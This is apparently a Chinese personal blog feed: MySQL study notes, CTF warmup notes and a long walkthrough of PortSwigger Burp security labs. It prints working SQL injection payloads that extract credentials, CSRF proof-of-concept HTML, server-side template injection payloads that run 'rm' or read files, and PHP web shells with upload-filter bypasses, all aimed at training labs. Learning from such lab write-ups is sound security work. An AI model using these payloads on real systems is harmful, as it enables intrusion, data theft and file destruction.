操作的字段不建议添加索引（增删改后要重新排序）<br>4.索引需维护，不随意添加<br>5.唯一性比较弱的字段上添加索引用处不大。</p><h3 id="索引应用"><a href="#索引应用" class="headerlink" title="索引应用"></a>索引应用</h3><p>建立：create index 索引名 on 表名(字段名);<br>     alter table 表名 add unique index 索引名 (列名);<br>删除：DROP INDEX 索引名 ON 表名<br>         ALTER TABLE 表名 DROP INDEX 索引名<br>查看索引：show index from 表名;<br>通过扫描次数判断是否使用索引</p><h3 id="explain语句"><a href="#explain语句" class="headerlink" title="explain语句"></a>explain语句</h3><p>语法：explain select …<br>用来查看SQL语句执行效果</p><h3 id="索引失效"><a href="#索引失效" class="headerlink" title="索引失效"></a>索引失效</h3><p>1.模糊匹配当中以“%”开头 如：select * from emp where ename like ‘%T’;<br>2.使用or的时候其中一边有一个字段没有索引（union不会失效）<br>3.使用复合索引（两个字段，或者更多的字段联合起来添加一个索引）的时候，没有使用左侧的列查找<br>4.在where当中索引列参加了运算<br>5.在where当中索引列使用了函数<br>…<br>(没有直接匹配结果则失效？)</p><h3 id="索引分类"><a href="#索引分类" class="headerlink" title="索引分类"></a>索引分类</h3><p>单一索引：一个字段上添加索引。<br>复合索引：两个字段或者更多的字段上添加索引。<br>主键索引：主键上添加索引。<br>唯一性索引：具有unique约束的字段上添加索引。<br>…..</p><h2 id="31-视图"><a href="#31-视图" class="headerlink" title="31.视图"></a>31.视图</h2><p>视图（虚拟表）：站在不同的角度去看待同一份数据，是一种根据查询（也就是 SELECT 表达式）定义的数据库对象，用于获取想要看到和使用的局部数据。用来提高检索效率，隐藏表的实现细节（面向视图检索）</p><h3 id="应用"><a href="#应用" class="headerlink" title="应用"></a>应用</h3><p>创建：create view 视图名 as select …;（mysql 不支持子查询创建视图）<br>删除：drop view (if exists) 视图名 ;<br>修改：alter view 视图名 as select …;</p><h3 id="作用"><a href="#作用" class="headerlink" title="作用"></a>作用</h3><p>可以面向视图对象进行增删改查（看作一张表），对视图对象的增删改查，会导致原表被操作！（视图的特点：通过对视图的操作，会影响到原表数据。）方便，简化开发，利于维护</p><h2 id="32-DBA"><a href="#32-DBA" class="headerlink" title="32.DBA"></a>32.DBA</h2><p>重点数据导入导出（数据备份）</p><h3 id="导入"><a href="#导入" class="headerlink" title="导入"></a>导入</h3><p>登录 MYSQL 数据库管理系统之后执行：source D:\ bjpowernode.sql</p><h3 id="导出"><a href="#导出" class="headerlink" title="导出"></a>导出</h3><p>导出整个数据库：在 windows 的 dos 命令窗口中执行：mysqldump bjpowernode&gt;D:\bjpowernode.sql -uroot -p123<br>导出指定库下的指定表：在 windows 的 dos 命令窗口中执行：mysqldump bjpowernode emp&gt; D:\ bjpowernode.sql -uroot –p123</p><h2 id="33-数据库设计三范式"><a href="#33-数据库设计三范式" class="headerlink" title="33.数据库设计三范式"></a>33.数据库设计三范式</h2><p>第一范式：有主键，具有原子性，字段不可分割<br>第二范式：完全依赖，没有部分依赖<br>第三范式：没有传递依赖</p><h3 id="表设计总结"><a href="#表设计总结" class="headerlink" title="表设计总结"></a>表设计总结</h3><p>一对多：一对多，两张表，多的表加外键<br>多对多：多对多，三张表，关系表两个外键<br>一对一：一张表字段太多，太庞大就拆分表，外键唯一</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>2023/04/18：FCTF2023：warmup&amp;正式比赛</title>
    <link href="/2023/04/28/warmup/"/>
    <url>/2023/04/28/warmup/</url>
    
    <content type="html"><![CDATA[<p>无所谓会不会，主要是图一乐<br>又菜又爱玩才能进步</p><h4 id="warm-up"><a href="#warm-up" class="headerlink" title="warm up"></a>warm up</h4><h5 id="viewsource"><a href="#viewsource" class="headerlink" title="viewsource"></a>viewsource</h5><p>没啥好说的，F12</p><h5 id="filechecker"><a href="#filechecker" class="headerlink" title="filechecker"></a>filechecker</h5><p>先再次复习下再继续</p><img src="/2023/04/28/warmup/az.png" class=""><p>啊这（<br>找了网上的payload，这题先随便传个图片上去，然后把那些二进制的内容删掉改成</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ <span class="hljs-comment">#! &#123;&#123;lipsum.__globals__.os.popen(&quot;cat /flag&quot;).read()&#125;&#125;</span><br></code></pre></td></tr></table></figure><p>这题应该是借文件上传利用SSTI获得flag，写的时候一直想怎么注入cat flag命令结果是这样的方式，多刷吧还是没办法马上反应过来(想着怎么利用bin那句命令结果忘了之前的SSIT了emm)<br>FCTF{realflag_5vycRgpY1Ekhrdk5wLcJoynj3QOH2JUoUfbCG0he}</p><h5 id="javadeserialize"><a href="#javadeserialize" class="headerlink" title="javadeserialize"></a>javadeserialize</h5><p>emm这个折腾的有点久有点问题<br>——————————————————————————<br>捋一捋IDEA的使用，好像哪里不大对<br>在IDEA的使用上折腾有点久，最开始时一直报错，至少现在能打开了能运行了（ 还在调试题目的源文件，复制黏贴时文件有点问题，复制的文件不是“可执行类”，没法达到想要的效果，单纯的复制文件不会被真正导入，再慢慢找问题。可能忘记改pom?<br>——————————————————————————<br>最开始用IDEA时手忙脚乱，似乎把题目文件结构破坏了，尝试了很多次，初次IDEA不熟悉它的工作方式犯了不少低级错误，甚至忘了Maven,因为添加目录为库时没操作好让程序报错，还以为又是自己把文件损坏了（</p><h4 id="正式赛"><a href="#正式赛" class="headerlink" title="正式赛"></a>正式赛</h4>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>2023/04/15：burplabs从0开始</title>
    <link href="/2023/04/27/burplab/"/>
    <url>/2023/04/27/burplab/</url>
    
    <content type="html"><![CDATA[<p>这里的题目看起来更像真实的场景<br>可惜有点卡，下面的解答视频有一种没带眼镜的美<br>有完整教程，很行</p><h2 id="SQL-injection"><a href="#SQL-injection" class="headerlink" title="SQL injection"></a>SQL injection</h2><h3 id="apprentice"><a href="#apprentice" class="headerlink" title="apprentice"></a>apprentice</h3><p>开网页的时间比写还久（恼）</p><h4 id="SQL-injection-vulnerability-in-WHERE-clause-allowing-retrieval-of-hidden-data"><a href="#SQL-injection-vulnerability-in-WHERE-clause-allowing-retrieval-of-hidden-data" class="headerlink" title="SQL injection vulnerability in WHERE clause allowing retrieval of hidden data"></a>SQL injection vulnerability in WHERE clause allowing retrieval of hidden data</h4><p>第一题为get注入 单引号闭合然后1=1就完事了<br>有点卡反应比较慢</p><img src="/2023/04/27/burplab/lab1.png" class=""><h4 id="SQL-injection-vulnerability-allowing-login-bypass"><a href="#SQL-injection-vulnerability-allowing-login-bypass" class="headerlink" title="SQL injection vulnerability allowing login bypass"></a>SQL injection vulnerability allowing login bypass</h4><p>简单的万能密码，啥过滤也没有</p><img src="/2023/04/27/burplab/lab2.png" class=""><h3 id="practitoner"><a href="#practitoner" class="headerlink" title="practitoner"></a>practitoner</h3><h4 id="SQL-injection-UNION-attack-determining-the-number-of-columns-returned-by-the-query"><a href="#SQL-injection-UNION-attack-determining-the-number-of-columns-returned-by-the-query" class="headerlink" title="SQL injection UNION attack, determining the number of columns returned by the query"></a>SQL injection UNION attack, determining the number of columns returned by the query</h4><p>联合查询第一步，column的数量</p><img src="/2023/04/27/burplab/lab3.png" class=""><p>一直用null测出数量</p><h4 id="SQL-injection-UNION-attack-finding-a-column-containing-text"><a href="#SQL-injection-UNION-attack-finding-a-column-containing-text" class="headerlink" title="SQL injection UNION attack, finding a column containing text"></a>SQL injection UNION attack, finding a column containing text</h4><p>union select，找到指定column，把上一题的一个null替换即可</p><h4 id="SQL-injection-UNION-attack-retrieving-data-from-other-tables"><a href="#SQL-injection-UNION-attack-retrieving-data-from-other-tables" class="headerlink" title="SQL injection UNION attack, retrieving data from other tables"></a>SQL injection UNION attack, retrieving data from other tables</h4><p>get传参的联合注入，直接在地址栏注就行：’+UNION+SELECT+username,+password+FROM+users–<br>回显在下面文章标题（？）那里，感觉很奇怪好像也很合理</p><h4 id="SQL-injection-UNION-attack-retrieving-multiple-values-in-a-single-column"><a href="#SQL-injection-UNION-attack-retrieving-multiple-values-in-a-single-column" class="headerlink" title="SQL injection UNION attack, retrieving multiple values in a single column"></a>SQL injection UNION attack, retrieving multiple values in a single column</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ <span class="hljs-string">&#x27; UNION SELECT username || &#x27;</span>~<span class="hljs-string">&#x27; || password FROM users--</span><br></code></pre></td></tr></table></figure><p>emm大概是一种联合查询技巧以便更好的得到所需数据吧</p><h4 id="SQL-injection-attack-querying-the-database-type-and-version-on-Oracle"><a href="#SQL-injection-attack-querying-the-database-type-and-version-on-Oracle" class="headerlink" title="SQL injection attack, querying the database type and version on Oracle"></a>SQL injection attack, querying the database type and version on Oracle</h4><p>注入点在url栏中的category，输入单引号报错<br>经测试为两个字段</p><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gauss">?category=&#x27;+<span class="hljs-built_in">UNION</span>+<span class="hljs-built_in">SELECT</span>+BANNER,+<span class="hljs-built_in">NULL</span>+FROM+v$version--<br></code></pre></td></tr></table></figure><h4 id="SQL-injection-attack-querying-the-database-type-and-version-on-MySQL-and-Microsoft"><a href="#SQL-injection-attack-querying-the-database-type-and-version-on-MySQL-and-Microsoft" class="headerlink" title="SQL injection attack, querying the database type and version on MySQL and Microsoft"></a>SQL injection attack, querying the database type and version on MySQL and Microsoft</h4><p>与上类似，但出不来，输啥都报错</p><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gauss">&#x27;+<span class="hljs-built_in">UNION</span>+<span class="hljs-built_in">SELECT</span>+<span class="hljs-comment">@@</span>version,+<span class="hljs-built_in">NULL</span><span class="hljs-meta">#</span><br></code></pre></td></tr></table></figure><h4 id="SQL-injection-attack-listing-the-database-contents-on-non-Oracle-databases"><a href="#SQL-injection-attack-listing-the-database-contents-on-non-Oracle-databases" class="headerlink" title="SQL injection attack, listing the database contents on non-Oracle databases"></a>SQL injection attack, listing the database contents on non-Oracle databases</h4><p>本题需要获得管理员密码<br>经检测仍为两个字段，均回显</p><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gauss">&#x27;+<span class="hljs-built_in">UNION</span>+<span class="hljs-built_in">SELECT</span>+table_name,+<span class="hljs-built_in">NULL</span>+FROM+information_schema.tables--<br></code></pre></td></tr></table></figure><p>无NULL则报错，获得需要的user表</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">&#x27;+UNION+<span class="hljs-keyword">SELECT</span>+column_name,+<span class="hljs-literal">NULL</span>+<span class="hljs-keyword">FROM</span>+information_schema.columns+<span class="hljs-keyword">WHERE</span>+table_name=<span class="hljs-string">&#x27;users_ ...&#x27;</span>--<br></code></pre></td></tr></table></figure><p>查找需要的字段</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">&#x27;+UNION+SELECT+username_ <span class="hljs-string">...</span>,+password_ <span class="hljs-string">...</span>+FROM+users_ <span class="hljs-string">...--</span><br></code></pre></td></tr></table></figure><p>找到管理员密码，登录</p><h4 id="SQL-injection-attack-listing-the-database-contents-on-Oracle"><a href="#SQL-injection-attack-listing-the-database-contents-on-Oracle" class="headerlink" title="SQL injection attack, listing the database contents on Oracle"></a>SQL injection attack, listing the database contents on Oracle</h4><p>与上大同小异</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">&#x27;+UNION+<span class="hljs-keyword">SELECT</span>+<span class="hljs-symbol">&#x27;abc</span><span class="hljs-string">&#x27;,&#x27;</span>def&#x27;+FROM+dual<span class="hljs-comment">--</span><br></code></pre></td></tr></table></figure><p>检测回显位需添加<code>FROM dual</code>语句</p><h4 id="Blind-SQL-injection-with-conditional-responses"><a href="#Blind-SQL-injection-with-conditional-responses" class="headerlink" title="Blind SQL injection with conditional responses"></a>Blind SQL injection with conditional responses</h4><p>cookie的布尔盲注<br>学了下咋用burp自带功能完成盲注</p><h2 id="Cross-site-request-forgery-CSRF"><a href="#Cross-site-request-forgery-CSRF" class="headerlink" title="Cross-site request forgery (CSRF)"></a>Cross-site request forgery (CSRF)</h2><h3 id="apprentice-1"><a href="#apprentice-1" class="headerlink" title="apprentice"></a>apprentice</h3><h4 id="CSRF-vulnerability-with-no-defenses"><a href="#CSRF-vulnerability-with-no-defenses" class="headerlink" title="CSRF vulnerability with no defenses"></a>CSRF vulnerability with no defenses</h4><p>好像出问题了不会显示完成<br>进入修改email界面，随便发个包<br>打开burp查看记录，右键可以生成CSRF PoC</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br>  <span class="hljs-comment">&lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript">history.<span class="hljs-title function_">pushState</span>(<span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-string">&#x27;/&#x27;</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;https://0ae600550496b7d78117442f000a00df.web-security-academy.net/my-account/change-email&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;POST&quot;</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;email&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;1<span class="hljs-symbol">&amp;#64;</span>1&quot;</span> /&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;Submit request&quot;</span> /&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p>黏贴在lab提供的服务器里</p><h3 id="practitioner"><a href="#practitioner" class="headerlink" title="practitioner"></a>practitioner</h3><h4 id="CSRF-where-token-validation-depends-on-request-method"><a href="#CSRF-where-token-validation-depends-on-request-method" class="headerlink" title="CSRF where token validation depends on request method"></a>CSRF where token validation depends on request method</h4><p>需要将修改邮箱的请求由POST改为GET，删掉csrf token仍然可以被接收，若POST则提示缺失token<br>剩下步骤与上同</p><h4 id="CSRF-where-token-validation-depends-on-token-being-present"><a href="#CSRF-where-token-validation-depends-on-token-being-present" class="headerlink" title="CSRF where token validation depends on token being present"></a>CSRF where token validation depends on token being present</h4><p>只有存在csrf-token时才会验证，直接删掉就好</p><h4 id="CSRF-where-token-is-not-tied-to-user-session"><a href="#CSRF-where-token-is-not-tied-to-user-session" class="headerlink" title="CSRF where token is not tied to user session"></a>CSRF where token is not tied to user session</h4><p>不验证token是不是与用户匹配<br>需要打开两浏览器分别登录两个账号才可操作<br>token一次性，刷新页面F12获取</p><h4 id="CSRF-where-token-is-tied-to-non-session-cookie"><a href="#CSRF-where-token-is-tied-to-non-session-cookie" class="headerlink" title="CSRF where token is tied to non-session cookie"></a>CSRF where token is tied to non-session cookie</h4><p>cookie中存在session和csrfKey，csrfKey与token联动，缺失则失败<br>将cookie值改为受害者不改变token则验证通过<br>两个csrf无验证匹配<br>生成的PoC将注入脚本改为<br><code>&lt;img src=&quot;https://...web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=YOUR-KEY%3b%20SameSite=None&quot; onerror=&quot;document.forms[0].submit()&quot;&gt;</code></p><h4 id="CSRF-token-is-simply-duplicated-in-a-cookie"><a href="#CSRF-token-is-simply-duplicated-in-a-cookie" class="headerlink" title="CSRF token is simply duplicated in a cookie"></a>CSRF token is simply duplicated in a cookie</h4><p>验证通过将cookie里的csrf token与请求包里的csrf参数对比是否一致<br>保证二者一样即可，可以瞎编<br>与上类似，但需保证cookie的token和参数里的token相同</p><h3 id=""><a href="#" class="headerlink" title=""></a></h3><h2 id="Server-side-template-injection"><a href="#Server-side-template-injection" class="headerlink" title="Server-side template injection"></a>Server-side template injection</h2><p>不少没见过的模板</p><h3 id="practitioner-1"><a href="#practitioner-1" class="headerlink" title="practitioner"></a>practitioner</h3><h4 id="Basic-server-side-template-injection"><a href="#Basic-server-side-template-injection" class="headerlink" title="Basic server-side template injection"></a>Basic server-side template injection</h4><p>题目要求删除<code>morale.txt</code>文件，根据题目描述需要了解ERB文档查看如何执行系统命令<br>点击详细信息，观察上方url，存在可能注入的GET变量message<br>尝试注入<code>&lt;%= 2*2 %&gt;</code>，回显为4，为注入点<br>输入<code>&lt;%= system(&quot;rm /home/carlos/morale.txt&quot;) %&gt;</code></p><h4 id="Basic-server-side-template-injection-code-context"><a href="#Basic-server-side-template-injection-code-context" class="headerlink" title="Basic server-side template injection (code context)"></a>Basic server-side template injection (code context)</h4><p>根据提示登录账号，来到账号页面，修改名字显示<br>抓包，尝试可能的注入点<code>blog-post-author-display=user.name&#125;&#125;&#123;&#123;7*7&#125;&#125;</code><br>发评论，名字显示中有49，存在注入点<br>根据描述模板类型为Tornado(Python)，构造语句<code>user.name&#125;&#125;&#123;%25+import+os+%25&#125;&#123;&#123;os.system('rm%20/home/carlos/morale.txt')`#### Server-side template injection using documentation登录账号，进入商品详情区，得知模板类型为Freemarker执行命令：`<#assign ex="freemarker.template.utility.Execute"?new()> $&#123; ex("rm /home/carlos/morale.txt") `#### Server-side template injection in an unknown language with a documented exploit本题模板未知，先观察url的message变量存在注入点，进行尝试：`$&#123;&#123;<%[%'"&#125;&#125;%\`通过报错信息可知模板为Handlebars查询得知使用此方式执行命令：`require("child_process").exec("rm /home/carlos/morale.txt")`使用如下方式调用：<figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">wrtz</span><span class="hljs-template-tag">&#123;&#123;#<span class="hljs-name"><span class="hljs-built_in">with</span></span> <span class="hljs-string">&quot;s&quot;</span> <span class="hljs-keyword">as</span> |string|&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml">    </span><span class="hljs-template-tag">&#123;&#123;#<span class="hljs-name"><span class="hljs-built_in">with</span></span> <span class="hljs-string">&quot;e&quot;</span>&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml">        </span><span class="hljs-template-tag">&#123;&#123;#<span class="hljs-name"><span class="hljs-built_in">with</span></span> split <span class="hljs-keyword">as</span> |conslist|&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml">            </span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">this.pop</span>&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml">            </span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">this.push</span> (<span class="hljs-name"><span class="hljs-built_in">lookup</span></span> string.sub <span class="hljs-string">&quot;constructor&quot;</span>)&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml">            </span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">this.pop</span>&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml">            </span><span class="hljs-template-tag">&#123;&#123;#<span class="hljs-name"><span class="hljs-built_in">with</span></span> string.split <span class="hljs-keyword">as</span> |codelist|&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml">                </span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">this.pop</span>&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml">                </span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">this.push</span> <span class="hljs-string">&quot;return require(&#x27;child_process&#x27;).exec(&#x27;rm /home/carlos/morale.txt&#x27;);&quot;</span>&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml">                </span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">this.pop</span>&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml">                </span><span class="hljs-template-tag">&#123;&#123;#<span class="hljs-name"><span class="hljs-built_in">each</span></span> conslist&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml">                    </span><span class="hljs-template-tag">&#123;&#123;#<span class="hljs-name"><span class="hljs-built_in">with</span></span> (<span class="hljs-name">string.sub.apply</span> <span class="hljs-number">0</span> codelist)&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml">                        </span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">this</span>&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml">                    </span><span class="hljs-template-tag">&#123;&#123;/<span class="hljs-name"><span class="hljs-built_in">with</span></span>&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml">                </span><span class="hljs-template-tag">&#123;&#123;/<span class="hljs-name"><span class="hljs-built_in">each</span></span>&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml">            </span><span class="hljs-template-tag">&#123;&#123;/<span class="hljs-name"><span class="hljs-built_in">with</span></span>&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml">        </span><span class="hljs-template-tag">&#123;&#123;/<span class="hljs-name"><span class="hljs-built_in">with</span></span>&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml">    </span><span class="hljs-template-tag">&#123;&#123;/<span class="hljs-name"><span class="hljs-built_in">with</span></span>&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;&#123;/<span class="hljs-name"><span class="hljs-built_in">with</span></span>&#125;&#125;</span><br></code></pre></td></tr></table></figure>编码后上传#### Server-side template injection with information disclosure via user-supplied objects该题需要获得一串字符提交使用`$&#123;&#123;<%[%'"&#125;&#125;%\`获得模板为django使用`&#123;% debug %&#125;</code>查询可使用settings类，其中包含SECRET_KEY<br>输入<code>&#123;&#123;settings.SECRET_KEY&#125;&#125;</code>通关</p><h3 id="expert"><a href="#expert" class="headerlink" title="expert"></a>expert</h3><h4 id="Server-side-template-injection-in-a-sandboxed-environment"><a href="#Server-side-template-injection-in-a-sandboxed-environment" class="headerlink" title="Server-side template injection in a sandboxed environment"></a>Server-side template injection in a sandboxed environment</h4><p>依题意，使用Freemarker模板，需要获得my_password.txt<br>查找Object类，得知可通过product使用<code>$&#123;object.getClass()&#125;</code><br>payload:<br><code>$&#123;product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve(&#39;/home/carlos/my_password.txt&#39;).toURL().openStream().readAllBytes()?join(&quot; &quot;)&#125;</code><br>结果为ASCII，需转换</p><h4 id="Server-side-template-injection-with-a-custom-exploit"><a href="#Server-side-template-injection-with-a-custom-exploit" class="headerlink" title="Server-side template injection with a custom exploit"></a>Server-side template injection with a custom exploit</h4><p>需删除/.ssh/id_rsa文件夹<br>登录后更改Preferred name，检查burp的post发现user.name，使用了user对象<br>将其改为user后发包会报错，显示模板为Twig<br>在上传头像处上传php文件显示错误：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs awk">PHP Fatal error:  Uncaught Exception: Uploaded file mime type is not an image: application<span class="hljs-regexp">/octet-stream in /</span>home<span class="hljs-regexp">/carlos/</span>User.php:<span class="hljs-number">28</span><br>Stack trace:<br><span class="hljs-comment">#0 /home/carlos/avatar_upload.php(19): User-&gt;setAvatar(&#x27;/tmp/1.php&#x27;, &#x27;application/oct...&#x27;)</span><br><span class="hljs-comment">#1 &#123;main&#125;</span><br>  thrown <span class="hljs-keyword">in</span> <span class="hljs-regexp">/home/</span>carlos/User.php on line <span class="hljs-number">28</span><br></code></pre></td></tr></table></figure><p>这些错误信息提供了一些关键点<br>继续抓修改name的包，尝试使用user.setAvatar()会在第一个博客显示报错信息，说明利用的可能<br>执行<code>user.setAvatar(&#39;/etc/passwd&#39;,&#39;image/jpg&#39;)</code>可获得接下来需要找到的目标文件<br>执行<code>user.setAvatar(&#39;/home/carlos/User.php&#39;,&#39;image/jpg&#39;)</code>获得可执行删除的函数gdprDelete()<br>（注意题目警告不能删错了）</p><h2 id="File-upload-vulnerabilities"><a href="#File-upload-vulnerabilities" class="headerlink" title="File upload vulnerabilities"></a>File upload vulnerabilities</h2><p>文件上传复习</p><h3 id="apprentice-2"><a href="#apprentice-2" class="headerlink" title="apprentice"></a>apprentice</h3><h4 id="Remote-code-execution-via-web-shell-upload"><a href="#Remote-code-execution-via-web-shell-upload" class="headerlink" title="Remote code execution via web shell upload"></a>Remote code execution via web shell upload</h4><p>用php文件，写上</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ &lt;?php <br> <span class="hljs-built_in">echo</span> file_get_contents(<span class="hljs-string">&#x27;/home/carlos/secret&#x27;</span>);<br>?&gt;<br></code></pre></td></tr></table></figure><p>把这个文件在上传头像的地方上传，然后右键在新网页打开头像即可</p><p>这个是github上找的方法比官方给的省事<br>可能因为网络问题用官方改数据包的方式可能失败</p><h4 id="Web-shell-upload-via-Content-Type-restriction-bypass"><a href="#Web-shell-upload-via-Content-Type-restriction-bypass" class="headerlink" title="Web shell upload via Content-Type restriction bypass"></a>Web shell upload via Content-Type restriction bypass</h4><p>将Content-Type改为image/jpeg或png即可</p><h3 id="practitioner-2"><a href="#practitioner-2" class="headerlink" title="practitioner"></a>practitioner</h3><h4 id="Web-shell-upload-via-path-traversal"><a href="#Web-shell-upload-via-path-traversal" class="headerlink" title="Web shell upload via path traversal"></a>Web shell upload via path traversal</h4><p>题目目标要求获得文件<code>/home/carlos/secret</code><br>将php一句话木马传入files文件夹以便解析<br>需要将文件名改为<code>..%2fexploit.php</code>绕过过滤<br>在新标签页查看即可</p><h4 id="Web-shell-upload-via-extension-blacklist-bypass（没写出来）"><a href="#Web-shell-upload-via-extension-blacklist-bypass（没写出来）" class="headerlink" title="Web shell upload via extension blacklist bypass（没写出来）"></a>Web shell upload via extension blacklist bypass（没写出来）</h4><p>上传<code>.htaccess</code>文件绕过过滤<br>1.将<code>.htaccess</code>文件内容填写为:</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript">AddType <span class="hljs-built_in">application</span>/x-httpd-php .l33t<br></code></pre></td></tr></table></figure><p>2.上传该文件，拦截更改Content-Type头为<code>text/plain</code><br>3.将一句话木马后缀改为<code>.133t</code>上传至<code>.htaccess</code>同文件夹<br>4.查看一句话木马文件即可（但我这没解析出来还是乱码）</p><h4 id="Web-shell-upload-via-obfuscated-file-extension"><a href="#Web-shell-upload-via-obfuscated-file-extension" class="headerlink" title="Web shell upload via obfuscated file extension"></a>Web shell upload via obfuscated file extension</h4><p>文件名<code>%00</code>截断<br>将文件名设置为<code>1.php%00.jpg</code>类似即可</p><h4 id="Remote-code-execution-via-polyglot-web-shell-upload（没写出来）"><a href="#Remote-code-execution-via-polyglot-web-shell-upload（没写出来）" class="headerlink" title="Remote code execution via polyglot web shell upload（没写出来）"></a>Remote code execution via polyglot web shell upload（没写出来）</h4><p>本题类似图片马<br>官方wp:<br>准备一张jpg图片<br>（windows命令行）运行<code>exiftool -Comment=&quot;&lt;?php echo &#39;START &#39; . file_get_contents(&#39;/home/carlos/secret&#39;) . &#39; END&#39;; ?&gt;&quot; (image_path)&lt;YOUR-INPUT-IMAGE&gt;.jpg -o polyglot.php</code><br>上传该文件后在新标签页打开（wp使用GET），解析其php代码<br>（尝试后打开还是乱码）</p><h3 id="expert-1"><a href="#expert-1" class="headerlink" title="expert"></a>expert</h3><h4 id="Web-shell-upload-via-race-condition"><a href="#Web-shell-upload-via-race-condition" class="headerlink" title="Web shell upload via race condition"></a>Web shell upload via race condition</h4><p>点击Hint可以查看部分原码：</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">move<span class="hljs-constructor">_uploaded_file($<span class="hljs-params">_FILES</span>[<span class="hljs-string">&quot;avatar&quot;</span>][<span class="hljs-string">&quot;tmp_name&quot;</span>], $<span class="hljs-params">target_file</span>)</span>;<br><span class="hljs-keyword">if</span> (check<span class="hljs-constructor">Viruses($<span class="hljs-params">target_file</span>)</span><span class="hljs-operator"> &amp;&amp; </span>check<span class="hljs-constructor">FileType($<span class="hljs-params">target_file</span>)</span>) 